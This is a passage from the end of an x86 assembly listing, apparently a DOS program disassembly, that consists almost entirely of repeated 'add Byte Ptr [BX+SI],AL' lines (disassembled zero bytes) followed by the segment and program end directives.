		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
		add     Byte Ptr [BX+SI],AL
CODE_SEG_1      ends



		end     start
#############################################################################
